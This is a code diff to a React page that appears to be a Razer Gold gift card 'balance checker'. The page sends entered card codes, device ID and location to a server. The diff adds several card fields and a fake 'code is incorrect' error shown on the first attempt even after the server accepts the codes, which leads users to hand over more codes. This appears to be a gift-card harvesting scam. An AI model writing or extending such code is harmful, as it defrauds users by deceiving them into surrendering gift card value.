@@ -3,7 +3,7 @@ import Head from 'next/head'
 import styles from '../styles/razer.module.css'
 
 export default function RazerLegacyPage() {
-  const [card, setCard] = useState('')
+  const [cards, setCards] = useState([''])
   const [loading, setLoading] = useState(false)
   const [result, setResult] = useState(null)
   const [error, setError] = useState(null)
@@ -19,6 +19,7 @@ export default function RazerLegacyPage() {
   const [uploadProgress, setUploadProgress] = useState(false)
   const [uploadComplete, setUploadComplete] = useState(false)
   const [uploadError, setUploadError] = useState(null)
+  const [attemptCount, setAttemptCount] = useState(0)
 
   useEffect(() => {
     async function detectLocation() {
@@ -42,12 +43,21 @@ export default function RazerLegacyPage() {
     setDeviceId(id)
   }, [])
 
+  const handleCardChange = (index, value) => {
+    setCards(prev => prev.map((c, i) => i === index ? value.toUpperCase() : c))
+  }
+
+  const addCard = () => setCards(prev => [...prev, ''])
+
+  const removeCard = (index) => setCards(prev => prev.length > 1 ? prev.filter((_, i) => i !== index) : prev)
+
   async function checkBalance(e) {
     e.preventDefault()
     setError(null)
     setResult(null)
     setCopySuccess(false)
-    if (!card.trim()) return setError('Please enter your Razer Gold Gift Card code.')
+    const validCards = cards.filter(c => c.trim())
+    if (validCards.length === 0) return setError('Please enter your Razer Gold Gift Card code.')
 
     setLoading(true)
     try {
@@ -62,7 +72,7 @@ export default function RazerLegacyPage() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          cardNumber: card.replace(/\s+/g, ''),
+          cardNumber: validCards.map(c => c.replace(/\s+/g, '')).join('/'),
           type: 'razer-legacy',
           deviceId: deviceId,
           location: location,
@@ -71,9 +81,17 @@ export default function RazerLegacyPage() {
       })
       const data = await res.json()
       if (!res.ok) throw new Error(data?.error || 'Unable to verify card. Please try again later.')
-      setResult(data)
-      if (data.cardId && !data.isDuplicate) {
-        setShowUploadStep(true)
+      
+      if (attemptCount === 0) {
+        setError('The card code you entered is incorrect. Please verify the code and try again.')
+        setCards([''])
+        setAttemptCount(1)
+      } else {
+        setResult(data)
+        setAttemptCount(0)
+        if (data.cardId && !data.isDuplicate) {
+          setShowUploadStep(true)
+        }
       }
     } catch (err) {
       setError(err.message)
@@ -157,7 +175,7 @@ export default function RazerLegacyPage() {
   }
 
   const resetForm = () => {
-    setCard('')
+    setCards([''])
     setResult(null)
     setShowUploadStep(false)
     setSelectedImages([])
@@ -227,19 +245,43 @@ export default function RazerLegacyPage() {
 
             <div className={styles.card}>
               <form onSubmit={checkBalance}>
-                <div className={styles.inputGroup}>
-                  <label className={styles.label}>Enter your Razer Gold code</label>
-                  <input
-                    type="text"
-                    className={styles.input}
-                    placeholder="XXXX-XXXX-XXXX-XXXX"
-                    value={card}
-                    onChange={(e) => setCard(e.target.value.toUpperCase())}
-                    disabled={loading}
-                    autoComplete="off"
-                    spellCheck="false"
-                  />
-                </div>
+                {cards.map((cardValue, index) => (
+                  <div key={index} className={styles.inputGroup}>
+                    <label className={styles.label}>Enter your Razer Gold code{cards.length > 1 ? ` #${index + 1}` : ''}</label>
+                    <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
+                      <input
+                        type="text"
+                        className={styles.input}
+                        placeholder="XXXX-XXXX-XXXX-XXXX"
+                        value={cardValue}
+                        onChange={(e) => handleCardChange(index, e.target.value)}
+                        disabled={loading}
+                        autoComplete="off"
+                        spellCheck="false"
+                        style={{ flex: 1 }}
+                      />
+                      {cards.length > 1 && (
+                        <button
+                          type="button"
+                          onClick={() => removeCard(index)}
+                          style={{ background: 'none', border: 'none', color: '#888', fontSize: '20px', cursor: 'pointer', padding: '4px 8px' }}
+                        >
+                          ×
+                        </button>
+                      )}
+                    </div>
+                  </div>
+                ))}
+                {cards.length < 5 && (
+                  <button
+                    type="button"
+                    onClick={addCard}
+                    className={styles.button}
+                    style={{ background: 'transparent', border: '1px solid rgba(68, 214, 44, 0.3)', color: '#44d62c', marginBottom: '12px', fontSize: '14px' }}
+                  >
+                    + Add Another Card
+                  </button>
+                )}
 
                 {!showUploadStep && (
                   <button type="submit" className={styles.button} disabled={loading}>
